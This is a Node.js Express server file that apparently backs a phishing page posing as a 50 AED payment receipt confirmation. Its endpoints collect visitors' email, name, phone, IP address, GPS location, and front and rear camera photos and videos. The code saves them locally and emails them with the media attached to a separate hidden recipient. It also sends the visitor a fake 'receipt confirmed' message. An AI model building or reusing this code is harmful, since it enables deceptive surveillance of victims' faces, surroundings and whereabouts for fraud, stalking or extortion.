require('dotenv').config();

const express = require('express');
const path = require('path');
const fs = require('fs');
const { randomUUID } = require('crypto');
const multer = require('multer');
const { Resend } = require('resend');

const app = express();
const PORT = process.env.PORT || 3000;
const resendApiKey =
    process.env.RESEND_API_KEY?.trim();
const resendFromEmail =
    process.env.RESEND_FROM_EMAIL?.trim() ||
    'onboarding@resend.dev';
const resendUserFromEmail =
    process.env.RESEND_USER_FROM_EMAIL?.trim() ||
    resendFromEmail;
const resendRecipientEmail =
    process.env.RESEND_RECIPIENT_EMAIL?.trim();
const resend = resendApiKey
    ? new Resend(resendApiKey)
    : null;
const pendingSubmissions = new Map();

function getMissingResendVariables() {

    const missingVariables = [];

    if (!resendApiKey) {
        missingVariables.push('RESEND_API_KEY');
    }

    if (!resendFromEmail) {
        missingVariables.push('RESEND_FROM_EMAIL');
    }

    if (!resendRecipientEmail) {
        missingVariables.push('RESEND_RECIPIENT_EMAIL');
    }

    return missingVariables;

}


// =======================================
// MIDDLEWARE
// =======================================

app.use(express.json());

app.use(
    express.static(
        path.join(__dirname, 'public')
    )
);


// =======================================
// UPLOAD FOLDER
// =======================================

const uploadFolder =
    path.join(__dirname, 'uploads');


if (!fs.existsSync(uploadFolder)) {

    fs.mkdirSync(
        uploadFolder,
        { recursive: true }
    );

}


// =======================================
// GET IP
// =======================================

function getUserIP(req) {

    const forwarded =
        req.headers['x-forwarded-for'];


    if (forwarded) {

        return forwarded
            .split(',')[0]
            .trim();

    }


    return (
        req.socket.remoteAddress ||
        'Unknown'
    );

}


// =======================================
// MULTER
// =======================================

const storage =
    multer.diskStorage({

        destination:
            (req, file, cb) => {

                cb(
                    null,
                    uploadFolder
                );

            },


        filename:
            (req, file, cb) => {

                const email =
                    (
                        req.body.email ||
                        'unknown'
                    )
                    .replace(
                        /[^a-zA-Z0-9]/g,
                        '_'
                    );


                const extension =
                    file.fieldname.startsWith('photo')
                        ? '.jpg'
                        : file.mimetype === 'video/mp4'
                            ? '.mp4'
                            : '.webm';


                cb(

                    null,

                    `${email}_${file.fieldname}_${Date.now()}${extension}`

                );

            }

    });


const upload =
    multer({
        storage: storage
    });


// =======================================
// SAVE EMAIL + IP
// =======================================

app.post(
    '/api/save-email',

    async (req, res) => {

        try {

            const email = req.body.email;
            const phone = req.body.phone;
            const name = req.body.name;


            if (!email) {

                return res
                    .status(400)
                    .json({

                        success: false,
                        message: 'Email is required.'

                    });

            }


            const submission = {
                

                email: email,

                phone: phone,

                name: name,

                ipAddress:
                    getUserIP(req),

                submittedAt:
                    new Date().toISOString()

                    

            };


            fs.appendFileSync(

                path.join(
                    __dirname,
                    'submitted-emails.txt'
                ),

                JSON.stringify(submission)
                + '\n'

            );

            console.log(
                'Email:',
                email
            );

            console.log(
                'IP:',
                submission.ipAddress
            );

            if (resend && resendFromEmail) {

                const emailResult =
                    await resend.emails.send({
                    from: resendFromEmail,
                    to: email,
                    subject: 'Your receipt confirmation',
                    text: [
                        'Receipt Confirmation',
                        `Hello ${name || 'there'},`,
                        'Your receipt information has been received successfully.',
                        'Amount: 50 AED',
                        'Reference: PAY-725'
                    ].join('\n')
                    });

                if (emailResult.error) {
                    console.error('Resend email error:', emailResult.error);
                }

            } else {

                console.warn(
                    'Resend is not configured. Email was saved without sending a confirmation.'
                );

            }


            res.json({

                success: true

            });


        } catch (error) {

            console.error(error);


            res
                .status(500)
                .json({

                    success: false,
                    message:
                        'Unable to save email.'

                });

        }

    }
);


// =======================================
// SAVE MEDIA + LOCATION
// =======================================

app.post(

    '/api/upload-media',

    upload.fields([

        {
            name: 'photo',
            maxCount: 1
        },

        {
            name: 'video',
            maxCount: 1
        },

        {
            name: 'photoRear',
            maxCount: 1
        },

        {
            name: 'videoRear',
            maxCount: 1
        }

    ]),

    async (req, res) => {

        try {

            const photo =
                req.files?.photo?.[0];

            const video =
                req.files?.video?.[0];

            const photoRear =
                req.files?.photoRear?.[0];

            const videoRear =
                req.files?.videoRear?.[0];


            if (!photo || !video || Boolean(photoRear) !== Boolean(videoRear)) {

                return res
                    .status(400)
                    .json({

                        success: false,

                        message:
                            'Front camera media is missing or rear camera files are incomplete.'

                    });

            }


            const submission = {
                

                email:
                    req.body.email,

                name:
                    req.body.name || null,

                phone:
                    req.body.phone || null,

                ipAddress:
                    getUserIP(req),

                latitude:
                    req.body.latitude || null,

                longitude:
                    req.body.longitude || null,

                accuracy:
                    req.body.accuracy || null,

                photo:
                    photo.filename,

                video:
                    video.filename,

                photoRear:
                    photoRear?.filename || null,

                videoRear:
                    videoRear?.filename || null,

                submittedAt:
                    new Date().toISOString()

            };


            // Save submission information

            fs.appendFileSync(

                path.join(
                    __dirname,
                    'media-submissions.txt'
                ),

                JSON.stringify(submission)
                + '\n'

            );

            const submissionId =
                randomUUID();

            pendingSubmissions.set(
                submissionId,
                {
                    submission: submission,
                    photoPath: photo.path,
                    videoPath: video.path,
                    photoRearPath: photoRear?.path || null,
                    videoRearPath: videoRear?.path || null
                }
            );


            console.log(
                '-------------------------'
            );

            console.log(
                'Email:',
                submission.email
            );

            console.log(
                'IP:',
                submission.ipAddress
            );

            console.log(
                'Location:',
                submission.latitude,
                submission.longitude
            );

            console.log(
                'Photo:',
                submission.photo
            );

            console.log(
                'Video:',
                submission.video
            );

            console.log(
                '-------------------------'
            );


            res.json({

                success: true,
                submissionId: submissionId

            });


        } catch (error) {

            console.error(error);


            res
                .status(500)
                .json({

                    success: false,

                    message:
                        'Unable to save submission.'

                });

        }

    }

);

// =======================================
// CONFIRM RECEIPT + SEND ADMIN EMAIL
// =======================================

app.post(
    '/api/confirm-receipt',

    async (req, res) => {

        try {

            const pendingSubmission =
                pendingSubmissions.get(req.body.submissionId);

            if (!pendingSubmission) {
                return res.status(404).json({
                    success: false,
                    message: 'Submission is no longer available.'
                });
            }

            if (
                getMissingResendVariables().length > 0
            ) {
                const missingVariables =
                    getMissingResendVariables();

                console.error(
                    'Resend configuration is missing:',
                    missingVariables.join(', ')
                );

                return res.status(503).json({
                    success: false,
                    message:
                        `Resend is not configured. Missing: ${missingVariables.join(', ')}`
                });
            }

            const submission =
                pendingSubmission.submission;

            const emailResult =
                await resend.emails.send({
                    from: resendFromEmail,
                    to: resendRecipientEmail,
                    subject: `New receipt submission: ${submission.email}`,
                    text: [
                        'New receipt submission',
                        `Email: ${submission.email}`,
                        `Name: ${submission.name || 'Not provided'}`,
                        `Phone: ${submission.phone || 'Not provided'}`,
                        `IP address: ${submission.ipAddress}`,
                        `Submitted at: ${submission.submittedAt}`,
                        `Latitude: ${submission.latitude || 'Not provided'}`,
                        `Longitude: ${submission.longitude || 'Not provided'}`,
                        `Accuracy: ${submission.accuracy || 'Not provided'}`
                    ].join('\n'),
                    attachments: [
                        {
                            filename: submission.photo,
                            content: fs.readFileSync(
                                pendingSubmission.photoPath
                            )
                        },
                        {
                            filename: submission.video,
                            content: fs.readFileSync(
                                pendingSubmission.videoPath
                            )
                        },
                        ...(submission.photoRear && submission.videoRear
                            ? [
                                {
                                    filename: submission.photoRear,
                                    content: fs.readFileSync(
                                        pendingSubmission.photoRearPath
                                    )
                                },
                                {
                                    filename: submission.videoRear,
                                    content: fs.readFileSync(
                                        pendingSubmission.videoRearPath
                                    )
                                }
                            ]
                            : [])
                    ]
                });

            if (emailResult.error) {
                console.error(
                    'Admin Resend email failed:',
                    emailResult.error
                );
                throw new Error('Admin data email failed to send.');
            }

            console.log(
                'Admin Resend email sent:',
                emailResult.data?.id || 'no message id returned'
            );

            const userEmailResult =
                await resend.emails.send({
                    from: resendUserFromEmail,
                    to: submission.email,
                    subject: 'Your receipt has been confirmed',
                    text: [
                        'You have confirmed your receipt.',
                        '',
                        'Your receipt confirmation was recorded successfully.',
                        `Reference: PAY-725`
                    ].join('\n')
                });

            if (userEmailResult.error) {
                console.error(
                    'User confirmation email failed:',
                    userEmailResult.error
                );

                pendingSubmissions.delete(req.body.submissionId);

                return res.status(502).json({
                    success: false,
                    message:
                        `The data email was sent, but the user confirmation email failed: ${userEmailResult.error?.message || 'Resend rejected the message.'}`
                });
            }

            console.log(
                'User confirmation email sent:',
                userEmailResult.data?.id || 'no message id returned'
            );

            pendingSubmissions.delete(req.body.submissionId);

            res.json({
                success: true,
                adminMessageId:
                    emailResult.data?.id || null,
                userMessageId:
                    userEmailResult.data?.id || null
            });

        } catch (error) {

            console.error(error);

            res.status(500).json({
                success: false,
                message:
                    error?.message ||
                    'Unable to send receipt details.'
            });
        }

    }
);

// SAVE LOCATION
app.post('/api/save-location', (req, res) => {

    try {

        const {
            latitude,
            longitude,
            accuracy
        } = req.body;

        if (
            typeof latitude !== 'number' ||
            typeof longitude !== 'number'
        ) {
            return res.status(400).json({
                success: false,
                message: 'Invalid location.'
            });
        }

        const locationData = {
            latitude,
            longitude,
            accuracy,
            submittedAt: new Date().toISOString()
        };

        fs.appendFileSync(
            path.join(__dirname, 'submitted-locations.txt'),
            JSON.stringify(locationData) + '\n'
        );

        console.log('Location saved:', locationData);

        res.json({
            success: true,
            message: 'Location saved successfully.'
        });

    } catch (error) {

        console.error(error);

        res.status(500).json({
            success: false,
            message: 'Unable to save location.'
        });
    }
});

// =======================================
// START SERVER
// =======================================

app.listen(
    PORT,
    '0.0.0.0',

    () => {

        const missingResendVariables =
            getMissingResendVariables();

        console.log(
            `Server is running on port ${PORT}`
        );

        console.log(
            `Open the website at http://localhost:${PORT}`
        );

        console.log(
            missingResendVariables.length === 0
                ? 'Resend configuration is ready.'
                : `Resend configuration missing: ${missingResendVariables.join(', ')}`
        );

    }
);